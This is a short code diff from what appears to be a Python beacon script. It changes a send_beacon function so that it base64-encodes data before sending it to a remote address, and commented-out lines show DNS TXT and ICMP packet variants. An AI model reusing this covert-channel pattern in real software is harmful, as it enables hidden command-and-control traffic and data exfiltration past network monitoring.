@@ -13,7 +13,7 @@ def send_beacon(addr,data):
         # pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
         # pkt_send(pkt_no_data,data,0)
         #pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
-        send_qery(addr,data,0)
+        send_qery(addr,base64.b64encode(data),0)
         print("send beacon")
         time.sleep(5)
     
